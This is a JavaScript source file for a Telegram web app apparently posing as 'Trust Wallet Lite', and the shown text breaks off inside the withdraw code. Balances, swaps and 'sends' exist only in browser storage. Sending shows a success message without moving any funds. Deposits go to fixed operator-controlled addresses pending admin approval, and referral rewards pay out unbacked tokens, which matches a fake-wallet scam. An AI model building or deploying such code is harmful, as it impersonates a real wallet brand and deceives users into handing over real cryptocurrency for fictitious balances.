// ============================================================================
// TRUST WALLET LITE - PROFESSIONAL VERSION 1.0
// ============================================================================

// ============================================================================
// SECTION 1: READ ENVIRONMENT VARIABLES
// ============================================================================

const FIREBASE_API_KEY = "{{FIREBASE_API_KEY}}";
const FIREBASE_AUTH_DOMAIN = "{{FIREBASE_AUTH_DOMAIN}}";
const FIREBASE_DATABASE_URL = "{{FIREBASE_DATABASE_URL}}";
const FIREBASE_PROJECT_ID = "{{FIREBASE_PROJECT_ID}}";
const FIREBASE_STORAGE_BUCKET = "{{FIREBASE_STORAGE_BUCKET}}";
const FIREBASE_MESSAGING_SENDER_ID = "{{FIREBASE_MESSAGING_SENDER_ID}}";
const FIREBASE_APP_ID = "{{FIREBASE_APP_ID}}";
const TELEGRAM_BOT_TOKEN = "{{TELEGRAM_BOT_TOKEN}}";
const ADMIN_ID = "{{ADMIN_ID}}";
const COINPAYMENTS_PUBLIC_KEY = "{{COINPAYMENTS_PUBLIC_KEY}}";
const COINPAYMENTS_PRIVATE_KEY = "{{COINPAYMENTS_PRIVATE_KEY}}";

// ============================================================================
// SECTION 2: FIREBASE CONFIGURATION
// ============================================================================

const firebaseConfig = {
    apiKey: FIREBASE_API_KEY,
    authDomain: FIREBASE_AUTH_DOMAIN,
    databaseURL: FIREBASE_DATABASE_URL,
    projectId: FIREBASE_PROJECT_ID,
    storageBucket: FIREBASE_STORAGE_BUCKET,
    messagingSenderId: FIREBASE_MESSAGING_SENDER_ID,
    appId: FIREBASE_APP_ID
};

let db = null;
let firebaseInitialized = false;

try {
    if (typeof firebase !== 'undefined') {
        firebase.initializeApp(firebaseConfig);
        db = firebase.firestore();
        firebaseInitialized = true;
        console.log("🔥 Firebase initialized");
    }
} catch (error) {
    console.error("Firebase error:", error);
}

// ============================================================================
// SECTION 3: TELEGRAM WEBAPP INITIALIZATION
// ============================================================================

const tg = window.Telegram?.WebApp;

if (tg) {
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation?.();
    console.log("✅ Telegram WebApp initialized");
}

// ============================================================================
// SECTION 4: CONSTANTS
// ============================================================================

const REFERRAL_BONUS = 25;
const WELCOME_BONUS = 10;
const SWAP_FEE_PERCENT = 0.003;
let TWT_PRICE = 1.25;

// ============================================================================
// SECTION 5: COINMARKETCAP ICONS
// ============================================================================

const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png'
};

// ============================================================================
// SECTION 6: ALL ASSETS
// ============================================================================

const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' }
];

// ============================================================================
// SECTION 7: REFERRAL MILESTONES
// ============================================================================

const REFERRAL_MILESTONES = [
    { referrals: 5, reward: 25, unit: 'TWT', icon: 'fa-star' },
    { referrals: 10, reward: 50, unit: 'TWT', icon: 'fa-medal' },
    { referrals: 25, reward: 120, unit: 'TWT', icon: 'fa-medal' },
    { referrals: 50, reward: 250, unit: 'TWT', icon: 'fa-crown' },
    { referrals: 100, reward: 500, unit: 'TWT', icon: 'fa-crown' },
    { referrals: 250, reward: 1000, unit: 'TWT', icon: 'fa-gem' },
    { referrals: 500, reward: 2500, unit: 'TWT', icon: 'fa-gem' },
    { referrals: 1000, reward: 5000, unit: 'TWT', icon: 'fa-diamond' }
];

// ============================================================================
// SECTION 8: DEPOSIT ADDRESSES
// ============================================================================

const DEPOSIT_ADDRESSES = {
    TWT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    USDT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BNB: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BTC: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    ETH: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    SOL: '3DjcSVxfeP3u4WcV9KniMH11btgThnoGxcx54dMtbfuR',
    TRX: 'TMSJH4QunFiUAqZ8iLvQDPajs1v4B3e5E6'
};

// ============================================================================
// SECTION 9: DEPOSIT MINIMUMS
// ============================================================================

const DEPOSIT_MINIMUMS = {
    TWT: 10,
    USDT: 10,
    BNB: 0.02,
    BTC: 0.0005,
    ETH: 0.005,
    SOL: 0.12,
    TRX: 40
};

// ============================================================================
// SECTION 10: WITHDRAW FEES
// ============================================================================

const WITHDRAW_FEES = {
    TWT: 1,
    USDT: 0.16,
    BNB: 0.0005,
    BTC: 0.0002,
    ETH: 0.001,
    SOL: 0.005,
    TRX: 1
};

// ============================================================================
// SECTION 11: CRYPTO IDS FOR COINGECKO
// ============================================================================

const CRYPTO_IDS = {
    TWT: 'trust-wallet-token',
    USDT: 'tether',
    BNB: 'binancecoin',
    BTC: 'bitcoin',
    ETH: 'ethereum',
    SOL: 'solana',
    TRX: 'tron'
};

// ============================================================================
// SECTION 12: STATE MANAGEMENT
// ============================================================================

let userData = null;
let currentUser = null;
let currentTab = 'wallet';
let isAdmin = false;
let livePrices = {};
let unreadNotifications = 0;
let currentCurrencyContext = null;
let currentSwapContext = null;
let currentHistoryFilter = 'all';
let lastPricesLoadTime = 0;
const PRICES_CACHE_TIME = 10800000;

// ============================================================================
// SECTION 13: STICKER SYSTEM
// ============================================================================

const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫', '⭐'];
let lastStickerTime = 0;
const STICKER_COOLDOWN = 12 * 60 * 1000;

function showRandomSticker() {
    const now = Date.now();
    if (now - lastStickerTime < STICKER_COOLDOWN) return;
    const stickerElement = document.getElementById('welcomeSticker');
    if (!stickerElement) return;
    const randomSticker = WELCOME_STICKERS[Math.floor(Math.random() * WELCOME_STICKERS.length)];
    stickerElement.textContent = randomSticker;
    stickerElement.classList.remove('sticker-pop', 'sticker-shake');
    void stickerElement.offsetWidth;
    stickerElement.classList.add('sticker-pop');
    setTimeout(() => stickerElement.classList.add('sticker-shake'), 200);
    setTimeout(() => {
        stickerElement.classList.remove('sticker-pop', 'sticker-shake');
        setTimeout(() => stickerElement.textContent = '', 300);
    }, 3000);
    lastStickerTime = now;
}

// ============================================================================
// SECTION 14: USER IDENTIFICATION
// ============================================================================

const userId = localStorage.getItem('twt_user_id') || 'user_' + Math.random().toString(36).substr(2, 9);
localStorage.setItem('twt_user_id', userId);

function generateReferralCode() {
    return userId.substr(-8).toUpperCase();
}

function getReferralLink() {
    if (!userData) return '';
    return `${window.location.origin}${window.location.pathname}?ref=${userData.referralCode}`;
}

function hasReferralCode() {
    const urlParams = new URLSearchParams(window.location.search);
    return !!(urlParams.get('ref') || urlParams.get('startapp'));
}

// ============================================================================
// SECTION 15: ADMIN SYSTEM
// ============================================================================

isAdmin = userId === ADMIN_ID;

function checkAdminAndAddCrown() {
    if (!isAdmin) return;
    const crownBtn = document.getElementById('adminCrownBtn');
    if (crownBtn) crownBtn.classList.remove('hidden');
}

// ============================================================================
// SECTION 16: TRANSACTIONS STORAGE
// ============================================================================

const TRANSACTIONS_KEY = `transactions_${userId}`;

function loadLocalTransactions() {
    try {
        const saved = localStorage.getItem(TRANSACTIONS_KEY);
        return saved ? JSON.parse(saved) : [];
    } catch (error) {
        return [];
    }
}

function saveLocalTransactions(transactions) {
    try {
        localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(transactions));
    } catch (error) {
        console.error("Error saving transactions:", error);
    }
}

function addTransaction(transaction) {
    try {
        const txWithId = {
            ...transaction,
            id: Date.now().toString() + Math.random().toString(36).substr(2, 5)
        };
        const allTransactions = loadLocalTransactions();
        if (!userData.transactions) userData.transactions = [];
        userData.transactions.unshift(txWithId);
        allTransactions.unshift(txWithId);
        saveLocalTransactions(allTransactions);
        saveUserData();
        return true;
    } catch (error) {
        return false;
    }
}

// ============================================================================
// SECTION 17: PRICE FETCHING
// ============================================================================

async function fetchLivePrices(force = false) {
    const now = Date.now();
    const cachedPrices = localStorage.getItem('live_prices');
    if (!force && cachedPrices && (now - lastPricesLoadTime) < PRICES_CACHE_TIME) {
        const { prices, timestamp } = JSON.parse(cachedPrices);
        livePrices = prices;
        lastPricesLoadTime = timestamp;
        updateUIPrices();
        return;
    }
    try {
        const ids = Object.values(CRYPTO_IDS).join(',');
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
        const data = await response.json();
        for (const [symbol, id] of Object.entries(CRYPTO_IDS)) {
            if (data[id]) {
                livePrices[symbol] = {
                    price: data[id].usd,
                    change: data[id].usd_24h_change || 0
                };
            }
        }
        if (!livePrices.TWT) livePrices.TWT = { price: 1.25, change: 0 };
        TWT_PRICE = livePrices.TWT.price;
        lastPricesLoadTime = now;
        localStorage.setItem('live_prices', JSON.stringify({ prices: livePrices, timestamp: now }));
        updateUIPrices();
    } catch (error) {
        console.error("Price fetch error:", error);
    }
}

function updateUIPrices() {
    if (currentTab === 'wallet') {
        renderAssets();
        updateTotalBalance();
    }
    if (currentTab === 'swap') updateSwapRate();
}

function refreshPrices() {
    fetchLivePrices(true);
    showToast('Prices refreshed!', 'success');
}

// ============================================================================
// SECTION 18: UTILITY FUNCTIONS
// ============================================================================

function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (balance === undefined) balance = 0;
    if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (['BNB', 'ETH', 'SOL', 'TRX'].includes(symbol)) return balance.toFixed(4) + ' ' + symbol;
    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
    return balance.toLocaleString() + ' ' + symbol;
}

function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    return num.toFixed(2);
}

function calculateTotalBalance() {
    if (!userData) return 0;
    let total = (userData.balances.USDT || 0);
    total += (userData.balances.TWT || 0) * (livePrices.TWT?.price || TWT_PRICE);
    total += (userData.balances.BNB || 0) * (livePrices.BNB?.price || 600);
    total += (userData.balances.BTC || 0) * (livePrices.BTC?.price || 65000);
    total += (userData.balances.ETH || 0) * (livePrices.ETH?.price || 3400);
    total += (userData.balances.SOL || 0) * (livePrices.SOL?.price || 150);
    total += (userData.balances.TRX || 0) * (livePrices.TRX?.price || 0.25);
    return total;
}

function updateTotalBalance() {
    const totalEl = document.getElementById('totalBalance');
    if (totalEl) totalEl.textContent = '$' + calculateTotalBalance().toFixed(2);
}

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    if (!toast) return;
    toastMessage.textContent = message;
    toast.classList.remove('hidden');
    const icon = toast.querySelector('i');
    if (type === 'success') icon.className = 'fa-regular fa-circle-check';
    else if (type === 'error') icon.className = 'fa-regular fa-circle-xmark';
    else icon.className = 'fa-regular fa-circle-info';
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) modal.classList.remove('show');
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied!', 'success');
}

// ============================================================================
// SECTION 19: TELEGRAM NOTIFICATIONS
// ============================================================================

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

async function sendTelegramNotification(chatId, message) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '{{TELEGRAM_BOT_TOKEN}}') return;
    try {
        await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error("Telegram error:", error);
    }
}

// ============================================================================
// SECTION 20: NOTIFICATION SYSTEM
// ============================================================================

function addNotification(message, type = 'info') {
    if (!userData) return;
    if (!userData.notifications) userData.notifications = [];
    const notification = {
        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
        message: message,
        type: type,
        read: false,
        timestamp: new Date().toISOString()
    };
    userData.notifications.unshift(notification);
    saveUserData();
    updateNotificationBadge();
    showToast(message, type);
    if (type === 'deposit' || type === 'withdraw') {
        sendTelegramNotification(ADMIN_ID, `🔔 ${type.toUpperCase()}: ${message}`);
    }
}

function updateNotificationBadge() {
    const badge = document.querySelector('.badge');
    if (badge && userData) {
        const unread = userData.notifications?.filter(n => !n.read).length || 0;
        badge.textContent = unread;
        badge.style.display = unread > 0 ? 'block' : 'none';
    }
}

function renderNotifications() {
    const container = document.getElementById('notificationsList');
    if (!container || !userData) return;
    const notifications = userData.notifications || [];
    const controls = `<div style="display:flex;gap:10px;margin-bottom:15px;"><button onclick="clearReadNotifications()" class="btn-secondary" style="flex:1;padding:8px;">Clear Read</button><button onclick="clearAllNotifications()" class="btn-secondary" style="flex:1;padding:8px;border-color:#ef4444;color:#ef4444;">Clear All</button></div>`;
    if (notifications.length === 0) {
        container.innerHTML = controls + '<div class="empty-state"><i class="fas fa-bell-slash"></i><p>No notifications</p></div>';
        return;
    }
    container.innerHTML = controls + notifications.map(n => {
        return `<div onclick="markNotificationRead('${n.id}')" style="background:${n.read ? 'transparent' : 'rgba(5,0,255,0.05)'};padding:12px;border-radius:12px;margin-bottom:8px;cursor:pointer;"><div><span>${n.type === 'success' ? '✓' : 'ℹ️'}</span><span>${new Date(n.timestamp).toLocaleTimeString()}</span></div><div>${n.message}</div></div>`;
    }).join('');
}

function markNotificationRead(id) {
    const n = userData.notifications.find(n => n.id == id);
    if (n && !n.read) {
        n.read = true;
        saveUserData();
        updateNotificationBadge();
        renderNotifications();
    }
}

function clearReadNotifications() {
    if (userData) {
        userData.notifications = userData.notifications.filter(n => !n.read);
        saveUserData();
        updateNotificationBadge();
        renderNotifications();
        showToast('Cleared read notifications', 'success');
    }
}

function clearAllNotifications() {
    if (userData && confirm('Delete all notifications?')) {
        userData.notifications = [];
        saveUserData();
        updateNotificationBadge();
        renderNotifications();
        showToast('All cleared', 'success');
    }
}

function showNotifications() {
    const modal = document.getElementById('notificationsModal');
    if (modal) {
        modal.classList.add('show');
        renderNotifications();
    }
}

// ============================================================================
// SECTION 21: USER DATA MANAGEMENT
// ============================================================================

function loadUserData() {
    const stored = localStorage.getItem(`twt_user_${userId}`);
    if (stored) {
        userData = JSON.parse(stored);
        currentUser = userData.userId;
        isAdmin = currentUser === ADMIN_ID;
        return true;
    }
    return false;
}

function saveUserData() {
    if (userData) localStorage.setItem(`twt_user_${userId}`, JSON.stringify(userData));
}

// ============================================================================
// SECTION 22: REFERRAL SYSTEM
// ============================================================================

function processReferral() {
    const refCode = new URLSearchParams(window.location.search).get('ref');
    if (!refCode || !userData || refCode === userData.referralCode || userData.referredBy) return;
    const pendingKey = `processed_ref_${userId}`;
    if (localStorage.getItem(pendingKey) === refCode) return;
    userData.referredBy = refCode;
    userData.balances.TWT = (userData.balances.TWT || 0) + WELCOME_BONUS;
    userData.totalTwtEarned = (userData.totalTwtEarned || 0) + WELCOME_BONUS;
    userData.referralCount = (userData.referralCount || 0) + 1;
    localStorage.setItem(pendingKey, refCode);
    saveUserData();
    addNotification(`🎉 Welcome! You received ${WELCOME_BONUS} TWT!`, 'success');
    addNotification(`🎉 Someone joined with your link! You got ${REFERRAL_BONUS} TWT!`, 'success');
    if (currentTab === 'referral') renderReferral();
}

function copyReferralLink() {
    navigator.clipboard.writeText(getReferralLink());
    showToast('Link copied!', 'success');
}

function shareReferral() {
    navigator.clipboard.writeText(`Join Trust Wallet Lite and get ${WELCOME_BONUS} TWT! ${getReferralLink()}`);
    showToast('Link copied!', 'success');
}

// ============================================================================
// SECTION 23: RENDER WALLET
// ============================================================================

function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'USDT' ? 1 : 0);
        const value = balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        return `<div class="asset-item" onclick="showAssetDetails('${asset.symbol}')"><div class="asset-left"><img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img"><div><h4>${asset.name}</h4><p>${asset.symbol} <span class="asset-change ${change >= 0 ? 'positive' : 'negative'}">${change >= 0 ? '+' : ''}${change.toFixed(2)}%</span></p></div></div><div class="asset-right"><div class="asset-balance">${formatBalance(balance, asset.symbol)}</div><div class="asset-value">$${formatNumber(value)}</div></div></div>`;
    }).join('');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    container.innerHTML = `<div class="balance-card"><div class="total-balance" id="totalBalance">$${calculateTotalBalance().toFixed(2)}</div><div class="balance-change"><i class="fas fa-arrow-up"></i> $0.05 (+0.0%)</div></div><div class="action-buttons"><button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>Send</span></button><button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-arrow-down"></i><span>Receive</span></button><button class="action-btn" onclick="showSwapModal()"><i class="fas fa-exchange-alt"></i><span>Swap</span></button><button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>Deposit</span></button><button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>Withdraw</span></button></div><div class="section-tabs"><button class="section-tab active">Crypto</button><button class="section-tab">Watchlist</button><button class="section-tab">NFTs</button></div><div id="assetsList" class="assets-list"></div>`;
    renderAssets();
}

function showAssetDetails(symbol) {
    const b = userData.balances[symbol] || 0;
    const p = livePrices[symbol]?.price || 0;
    showToast(`${symbol}: ${formatBalance(b, symbol)} ($${formatNumber(b * p)})`, 'info');
}

// ============================================================================
// SECTION 24: RENDER REFERRAL
// ============================================================================

function renderReferral() {
    const container = document.getElementById('referralContainer');
    if (!container) return;
    container.innerHTML = `<div class="referral-stats"><h3>TOTAL REFERRALS</h3><div class="stat-number">${userData.referralCount || 0}</div><h3>TWT EARNED</h3><div class="stat-number">${(userData.totalTwtEarned || 0).toLocaleString()} TWT</div><h3>USDT EARNED</h3><div class="stat-number">${(userData.totalUsdtEarned || 0).toFixed(2)} USDT</div></div><div class="referral-link-card"><h4>Your Referral Link</h4><div class="link-container"><input type="text" id="referralLink" value="${getReferralLink()}" readonly><button class="copy-btn" onclick="copyReferralLink()"><i class="fas fa-copy"></i></button><button class="share-btn" onclick="shareReferral()"><i class="fas fa-share-alt"></i></button></div><p>Share your link and get ${REFERRAL_BONUS} TWT for every friend who joins!</p></div><div id="milestonesList" class="milestones-list"></div>`;
    renderMilestones();
}

function renderMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container) return;
    container.innerHTML = REFERRAL_MILESTONES.map(m => {
        const progress = Math.min((userData.referralCount / m.referrals) * 100, 100);
        const canClaim = userData.referralCount >= m.referrals && !userData.referralMilestones?.find(x => x.referrals === m.referrals)?.claimed;
        const claimed = userData.referralMilestones?.find(x => x.referrals === m.referrals)?.claimed;
        return `<div class="milestone-item"><div class="milestone-header"><span><i class="fa-regular ${m.icon}"></i> ${m.referrals} Referrals</span><span>${m.reward} ${m.unit}</span></div><div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div><div class="progress-text">${userData.referralCount}/${m.referrals}</div>${canClaim ? `<button class="claim-btn" onclick="claimReferralMilestone(${m.referrals})">Claim Reward</button>` : claimed ? '<button class="claim-btn completed" disabled>Claimed</button>' : ''}</div>`;
    }).join('');
}

function claimReferralMilestone(referrals) {
    const m = REFERRAL_MILESTONES.find(x => x.referrals === referrals);
    if (!userData.referralMilestones) userData.referralMilestones = REFERRAL_MILESTONES.map(x => ({ ...x, claimed: false }));
    const idx = userData.referralMilestones.findIndex(x => x.referrals === referrals);
    if (idx === -1 || userData.referralMilestones[idx].claimed) return;
    if (userData.referralCount < referrals) {
        showToast(`Need ${referrals} referrals`, 'error');
        return;
    }
    if (m.unit === 'TWT') {
        userData.balances.TWT += m.reward;
        userData.totalTwtEarned += m.reward;
    } else {
        userData.balances.USDT += m.reward;
        userData.totalUsdtEarned += m.reward;
    }
    userData.referralMilestones[idx].claimed = true;
    addTransaction({
        type: 'referral_reward',
        amount: m.reward,
        currency: m.unit,
        details: `Milestone: ${referrals} referrals`,
        timestamp: new Date().toISOString()
    });
    saveUserData();
    renderMilestones();
    updateUI();
    showToast(`🎉 Claimed ${m.reward} ${m.unit}!`, 'success');
}

// ============================================================================
// SECTION 25: RENDER SWAP
// ============================================================================

function renderSwap() {
    const container = document.getElementById('swapContainer');
    if (!container) return;
    container.innerHTML = `<div class="swap-container"><div class="swap-box"><div class="swap-label">From</div><div class="swap-row"><input type="number" id="swapFromAmount" placeholder="0.00" oninput="calculateSwap()"><div class="currency-selector-small" onclick="showSwapCurrencySelector('from')"><img id="swapFromIcon" src="${getCurrencyIcon('TWT')}"><span id="swapFromSymbol">TWT</span><i class="fas fa-chevron-down"></i></div></div><div class="balance-hint">Balance: <span id="swapFromBalance">${formatBalance(userData.balances.TWT || 0, 'TWT')}</span> <span class="percentage-buttons"><button onclick="setSwapPercentage(25)">25%</button><button onclick="setSwapPercentage(50)">50%</button><button onclick="setSwapPercentage(100)">Max</button></span></div></div><div class="swap-arrow"><i class="fas fa-arrow-down"></i></div><div class="swap-box"><div class="swap-label">To</div><div class="swap-row"><input type="number" id="swapToAmount" placeholder="0.00" readonly><div class="currency-selector-small" onclick="showSwapCurrencySelector('to')"><img id="swapToIcon" src="${getCurrencyIcon('USDT')}"><span id="swapToSymbol">USDT</span><i class="fas fa-chevron-down"></i></div></div><div class="balance-hint">Balance: <span id="swapToBalance">${formatBalance(userData.balances.USDT || 0, 'USDT')}</span></div></div><div class="swap-rate" id="swapRateDisplay">1 TWT ≈ $${(livePrices.TWT?.price || TWT_PRICE).toFixed(4)}</div><div class="swap-fee"><span>Swapper fee</span><span id="swapFee">$0.01</span></div><div class="swap-provider"><span>Provider</span><span>Rango</span></div><button id="confirmSwapBtn" class="btn-primary">Continue</button></div>`;
    document.getElementById('confirmSwapBtn')?.addEventListener('click', confirmSwap);
    updateSwapRate();
}

function updateSwapBalances() {
    const fromSym = document.getElementById('swapFromSymbol')?.textContent || 'TWT';
    const toSym = document.getElementById('swapToSymbol')?.textContent || 'USDT';
    document.getElementById('swapFromBalance').textContent = formatBalance(userData.balances[fromSym] || 0, fromSym);
    document.getElementById('swapToBalance').textContent = formatBalance(userData.balances[toSym] || 0, toSym);
}

function setSwapPercentage(percent) {
    const fromSym = document.getElementById('swapFromSymbol')?.textContent || 'TWT';
    const balance = userData.balances[fromSym] || 0;
    let amount = balance * (percent / 100);
    if (fromSym === 'TWT') amount = Math.floor(amount);
    else amount = parseFloat(amount.toFixed(6));
    document.getElementById('swapFromAmount').value = amount;
    calculateSwap();
}

function calculateSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount')?.value) || 0;
    const fromSym = document.getElementById('swapFromSymbol')?.textContent || 'TWT';
    const toSym = document.getElementById('swapToSymbol')?.textContent || 'USDT';
    const fromPrice = livePrices[fromSym]?.price || (fromSym === 'USDT' ? 1 : TWT_PRICE);
    const toPrice = livePrices[toSym]?.price || (toSym === 'USDT' ? 1 : TWT_PRICE);
    let toAmount = 0;
    if (fromPrice > 0 && toPrice > 0) toAmount = (fromAmount * fromPrice) / toPrice;
    document.getElementById('swapToAmount').value = toAmount.toFixed(6);
    updateSwapRate();
    const fee = fromAmount * fromPrice * SWAP_FEE_PERCENT;
    document.getElementById('swapFee').textContent = `$${fee.toFixed(4)}`;
}

function updateSwapRate() {
    const fromSym = document.getElementById('swapFromSymbol')?.textContent || 'TWT';
    const toSym = document.getElementById('swapToSymbol')?.textContent || 'USDT';
    const fromPrice = livePrices[fromSym]?.price || (fromSym === 'USDT' ? 1 : TWT_PRICE);
    const toPrice = livePrices[toSym]?.price || (toSym === 'USDT' ? 1 : TWT_PRICE);
    let rateText = '';
    if (fromPrice > 0 && toPrice > 0) rateText = `1 ${fromSym} ≈ ${(fromPrice / toPrice).toFixed(6)} ${toSym}`;
    document.getElementById('swapRateDisplay').textContent = rateText;
}

function confirmSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount')?.value) || 0;
    const fromSym = document.getElementById('swapFromSymbol')?.textContent || 'TWT';
    const toSym = document.getElementById('swapToSymbol')?.textContent || 'USDT';
    const toAmount = parseFloat(document.getElementById('swapToAmount')?.value) || 0;
    if (!fromAmount || fromAmount <= 0) {
        showToast('Enter amount', 'error');
        return;
    }
    if ((userData.balances[fromSym] || 0) < fromAmount) {
        showToast(`Insufficient ${fromSym}`, 'error');
        return;
    }
    const fromPrice = livePrices[fromSym]?.price || (fromSym === 'USDT' ? 1 : TWT_PRICE);
    const fee = fromAmount * fromPrice * SWAP_FEE_PERCENT;
    let finalFromAmount = fromAmount;
    if (fromSym === 'USDT') finalFromAmount = fromAmount - fee;
    if (finalFromAmount <= 0) {
        showToast('Amount too small after fee', 'error');
        return;
    }
    userData.balances[fromSym] -= finalFromAmount;
    userData.balances[toSym] = (userData.balances[toSym] || 0) + toAmount;
    addTransaction({
        type: 'swap',
        fromAmount: finalFromAmount,
        fromCurrency: fromSym,
        toAmount: toAmount,
        toCurrency: toSym,
        fee: fee,
        timestamp: new Date().toISOString()
    });
    saveUserData();
    updateUI();
    showToast(`✅ Swapped ${formatBalance(finalFromAmount, fromSym)} to ${formatBalance(toAmount, toSym)}`, 'success');
    closeModal('swapModal');
    document.getElementById('swapFromAmount').value = '';
}

// ============================================================================
// SECTION 26: SEND & RECEIVE
// ============================================================================

function showSendModal() {
    document.getElementById('sendModal').classList.add('show');
}

function showReceiveModal() {
    updateReceiveAddress();
    document.getElementById('receiveModal').classList.add('show');
}

function sendTransaction() {
    const currency = document.getElementById('sendCurrencySymbol')?.textContent || 'TWT';
    const amount = parseFloat(document.getElementById('sendAmount')?.value);
    const address = document.getElementById('sendAddress')?.value.trim();
    if (!amount || amount <= 0) {
        showToast('Enter amount', 'error');
        return;
    }
    if (!address) {
        showToast('Enter address', 'error');
        return;
    }
    if ((userData.balances[currency] || 0) < amount) {
        showToast(`Insufficient ${currency}`, 'error');
        return;
    }
    userData.balances[currency] -= amount;
    addTransaction({
        type: 'send',
        amount: amount,
        currency: currency,
        address: address,
        timestamp: new Date().toISOString()
    });
    saveUserData();
    updateUI();
    showToast(`✅ Sent ${formatBalance(amount, currency)} to ${address.substring(0, 10)}...`, 'success');
    closeModal('sendModal');
    document.getElementById('sendAmount').value = '';
    document.getElementById('sendAddress').value = '';
}

function updateReceiveAddress() {
    const currency = document.getElementById('receiveCurrencySymbol')?.textContent || 'TWT';
    document.getElementById('receiveAddress').textContent = DEPOSIT_ADDRESSES[currency] || DEPOSIT_ADDRESSES.TWT;
}

function copyAddress() {
    const addr = document.getElementById('receiveAddress')?.textContent;
    if (addr) {
        navigator.clipboard.writeText(addr);
        showToast('Address copied!', 'success');
    }
}

// ============================================================================
// SECTION 27: DEPOSIT & WITHDRAW
// ============================================================================

function showDepositModal() {
    updateDepositInfo();
    document.getElementById('depositModal').classList.add('show');
}

function updateDepositInfo() {
    const currency = document.getElementById('depositCurrencySymbol')?.textContent || 'TWT';
    document.getElementById('depositAddress').textContent = DEPOSIT_ADDRESSES[currency] || DEPOSIT_ADDRESSES.TWT;
    document.getElementById('depositMinAmount').textContent = DEPOSIT_MINIMUMS[currency] || 10;
}

function copyDepositAddress() {
    const addr = document.getElementById('depositAddress')?.textContent;
    if (addr) {
        navigator.clipboard.writeText(addr);
        showToast('Address copied!', 'success');
    }
}

function submitDeposit() {
    const currency = document.getElementById('depositCurrencySymbol')?.textContent || 'TWT';
    const amount = parseFloat(document.getElementById('depositAmount')?.value);
    const txHash = document.getElementById('depositTxHash')?.value.trim() || '';
    if (!amount || amount <= 0) {
        showToast('Enter amount', 'error');
        return;
    }
    const min = DEPOSIT_MINIMUMS[currency] || 10;
    if (amount < min) {
        showToast(`Minimum deposit is ${min} ${currency}`, 'error');
        return;
    }
    const req = {
        id: 'dep_' + Date.now(),
        userId: userId,
        currency: currency,
        amount: amount,
        txHash: txHash,
        status: 'pending',
        timestamp: new Date().toISOString()
    };
    if (!userData.depositRequests) userData.depositRequests = [];
    userData.depositRequests.push(req);
    addTransaction({ ...req, status: 'pending' });
    saveUserData();
    addNotification(`💰 Deposit request: ${amount} ${currency} submitted. Waiting for admin approval.`, 'info');
    showToast(`✅ Deposit request submitted for ${amount} ${currency}!`, 'success');
    closeModal('depositModal');
    document.getElementById('depositAmount').value = '';
    document.getElementById('depositTxHash').value = '';
}

function showWithdrawModal() {
    updateWithdrawInfo();
    document.getElementById('withdrawModal').classList.add('show');
}

function updateWithdrawInfo() {
    const currency = document.getElementById('withdrawCurrencySymbol')?.textContent || 'TWT';
